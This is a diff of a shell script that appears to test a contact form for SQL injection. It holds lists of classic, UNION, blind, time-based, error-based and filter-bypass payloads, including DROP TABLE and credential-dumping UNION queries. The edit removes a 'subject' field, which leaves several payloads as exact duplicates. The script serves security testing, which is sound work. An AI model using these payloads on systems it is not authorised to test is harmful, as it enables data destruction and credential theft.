@@ -26,105 +26,105 @@ echo
 echo "[1] Testing CLASSIC SQL INJECTION payloads..." | tee -a $OUTPUT_FILE
 
 classic_sql_payloads=(
-    '{"subject":"test\" OR 1=1 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" OR 1=1 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" OR 1=1 --"}'
-    '{"subject":"test\"; DROP TABLE users; --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\"; DROP TABLE users; --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\"; DROP TABLE users; --"}'
-    '{"subject":"test\" OR \"1\"=\"1","message":"test","email":"test1@test.com"}'
-    '{"subject":"test","message":"test\" OR \"1\"=\"1","email":"test1@test.com"}'
-    '{"subject":"test","message":"test","email":"test1@test.com\" OR \"1\"=\"1"}'
-    '{"subject":"test\") OR (\"1\"=\"1","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\") OR (\"1\"=\"1","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\") OR (\"1\"=\"1"}'
+    '{"message":"test\" OR 1=1 --","email":"test@test.com"}'
+    '{"message":"test\" OR 1=1 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" OR 1=1 --"}'
+    '{"message":"test\"; DROP TABLE users; --","email":"test@test.com"}'
+    '{"message":"test\"; DROP TABLE users; --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\"; DROP TABLE users; --"}'
+    '{"message":"test\" OR \"1\"=\"1","email":"test1@test.com"}'
+    '{"message":"test\" OR \"1\"=\"1","email":"test1@test.com"}'
+    '{"message":"test","email":"test1@test.com\" OR \"1\"=\"1"}'
+    '{"message":"test\") OR (\"1\"=\"1","email":"test@test.com"}'
+    '{"message":"test\") OR (\"1\"=\"1","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\") OR (\"1\"=\"1"}'
 )
 
 echo "[2] Testing UNION-BASED SQL INJECTION payloads..." | tee -a $OUTPUT_FILE
 
 union_sql_payloads=(
-    '{"subject":"test\" UNION SELECT 1,2,3 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" UNION SELECT 1,2,3 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT 1,2,3 --"}'
-    '{"subject":"test\" UNION SELECT null,null,null --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" UNION SELECT null,null,null --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT null,null,null --"}'
-    '{"subject":"test\" UNION SELECT username,password FROM users --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" UNION SELECT username,password FROM users --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT username,password FROM users --"}'
-    '{"subject":"test\" UNION SELECT schema_name FROM information_schema.schemata --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" UNION SELECT table_name FROM information_schema.tables --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" UNION SELECT column_name FROM information_schema.columns --"}'
+    '{"message":"test\" UNION SELECT 1,2,3 --","email":"test@test.com"}'
+    '{"message":"test\" UNION SELECT 1,2,3 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" UNION SELECT 1,2,3 --"}'
+    '{"message":"test\" UNION SELECT null,null,null --","email":"test@test.com"}'
+    '{"message":"test\" UNION SELECT null,null,null --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" UNION SELECT null,null,null --"}'
+    '{"message":"test\" UNION SELECT username,password FROM users --","email":"test@test.com"}'
+    '{"message":"test\" UNION SELECT username,password FROM users --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" UNION SELECT username,password FROM users --"}'
+    '{"message":"test\" UNION SELECT schema_name FROM information_schema.schemata --","email":"test@test.com"}'
+    '{"message":"test\" UNION SELECT table_name FROM information_schema.tables --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" UNION SELECT column_name FROM information_schema.columns --"}'
 )
 
 echo "[3] Testing BOOLEAN-BASED BLIND SQL INJECTION payloads..." | tee -a $OUTPUT_FILE
 
 blind_sql_payloads=(
-    '{"subject":"test\" AND 1=1 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test\" AND 1=2 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND 1=1 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND 1=2 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND 1=1 --"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND 1=2 --"}'
-    '{"subject":"test\" AND (SELECT COUNT(*) FROM users) > 0 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND (SELECT COUNT(*) FROM users) > 0 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND (SELECT COUNT(*) FROM users) > 0 --"}'
-    '{"subject":"test\" AND LENGTH(database()) > 5 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND LENGTH(database()) > 5 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND LENGTH(database()) > 5 --"}'
+    '{"message":"test\" AND 1=1 --","email":"test@test.com"}'
+    '{"message":"test\" AND 1=2 --","email":"test@test.com"}'
+    '{"message":"test\" AND 1=1 --","email":"test@test.com"}'
+    '{"message":"test\" AND 1=2 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND 1=1 --"}'
+    '{"message":"test","email":"test@test.com\" AND 1=2 --"}'
+    '{"message":"test\" AND (SELECT COUNT(*) FROM users) > 0 --","email":"test@test.com"}'
+    '{"message":"test\" AND (SELECT COUNT(*) FROM users) > 0 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND (SELECT COUNT(*) FROM users) > 0 --"}'
+    '{"message":"test\" AND LENGTH(database()) > 5 --","email":"test@test.com"}'
+    '{"message":"test\" AND LENGTH(database()) > 5 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND LENGTH(database()) > 5 --"}'
 )
 
 echo "[4] Testing TIME-BASED BLIND SQL INJECTION payloads..." | tee -a $OUTPUT_FILE
 
 time_sql_payloads=(
-    '{"subject":"test\" AND SLEEP(3) --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND SLEEP(3) --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND SLEEP(3) --"}'
-    '{"subject":"test\"; WAITFOR DELAY \"00:00:03\" --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\"; WAITFOR DELAY \"00:00:03\" --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\"; WAITFOR DELAY \"00:00:03\" --"}'
-    '{"subject":"test\" AND IF(1=1,SLEEP(3),0) --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND IF(1=1,SLEEP(3),0) --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND IF(1=1,SLEEP(3),0) --"}'
+    '{"message":"test\" AND SLEEP(3) --","email":"test@test.com"}'
+    '{"message":"test\" AND SLEEP(3) --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND SLEEP(3) --"}'
+    '{"message":"test\"; WAITFOR DELAY \"00:00:03\" --","email":"test@test.com"}'
+    '{"message":"test\"; WAITFOR DELAY \"00:00:03\" --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\"; WAITFOR DELAY \"00:00:03\" --"}'
+    '{"message":"test\" AND IF(1=1,SLEEP(3),0) --","email":"test@test.com"}'
+    '{"message":"test\" AND IF(1=1,SLEEP(3),0) --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND IF(1=1,SLEEP(3),0) --"}'
 )
 
 echo "[5] Testing ERROR-BASED SQL INJECTION payloads..." | tee -a $OUTPUT_FILE
 
 error_sql_payloads=(
-    '{"subject":"test\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --"}'
-    '{"subject":"test\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --"}'
+    '{"message":"test\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --","email":"test@test.com"}'
+    '{"message":"test\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --"}'
+    '{"message":"test\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --","email":"test@test.com"}'
+    '{"message":"test\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --"}'
 )
 
 echo "[6] Testing FILTER BYPASS SQL INJECTION payloads..." | tee -a $OUTPUT_FILE
 
 bypass_sql_payloads=(
-    '{"subject":"test\u0027 OR 1=1 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\u0027 OR 1=1 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\u0027 OR 1=1 --"}'
-    '{"subject":"test%27 OR 1=1 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test%27 OR 1=1 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com%27 OR 1=1 --"}'
-    '{"subject":"test/**/OR/**/1=1 --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test/**/OR/**/1=1 --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com/**/OR/**/1=1 --"}'
-    '{"subject":"test\" OR 1=1#","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" OR 1=1#","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" OR 1=1#"}'
+    '{"message":"test\u0027 OR 1=1 --","email":"test@test.com"}'
+    '{"message":"test\u0027 OR 1=1 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\u0027 OR 1=1 --"}'
+    '{"message":"test%27 OR 1=1 --","email":"test@test.com"}'
+    '{"message":"test%27 OR 1=1 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com%27 OR 1=1 --"}'
+    '{"message":"test/**/OR/**/1=1 --","email":"test@test.com"}'
+    '{"message":"test/**/OR/**/1=1 --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com/**/OR/**/1=1 --"}'
+    '{"message":"test\" OR 1=1#","email":"test@test.com"}'
+    '{"message":"test\" OR 1=1#","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" OR 1=1#"}'
 )
 
 echo "[7] Testing DATABASE-SPECIFIC SQL INJECTION payloads..." | tee -a $OUTPUT_FILE
 
 db_specific_sql_payloads=(
-    '{"subject":"test\" AND (SELECT @@version) --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND (SELECT version()) --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND (SELECT sqlite_version()) --"}'
-    '{"subject":"test\" AND (SELECT user()) --","message":"test","email":"test@test.com"}'
-    '{"subject":"test","message":"test\" AND (SELECT current_user()) --","email":"test@test.com"}'
-    '{"subject":"test","message":"test","email":"test@test.com\" AND (SELECT database()) --"}'
+    '{"message":"test\" AND (SELECT @@version) --","email":"test@test.com"}'
+    '{"message":"test\" AND (SELECT version()) --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND (SELECT sqlite_version()) --"}'
+    '{"message":"test\" AND (SELECT user()) --","email":"test@test.com"}'
+    '{"message":"test\" AND (SELECT current_user()) --","email":"test@test.com"}'
+    '{"message":"test","email":"test@test.com\" AND (SELECT database()) --"}'
 )
 
 # Combine all payloads
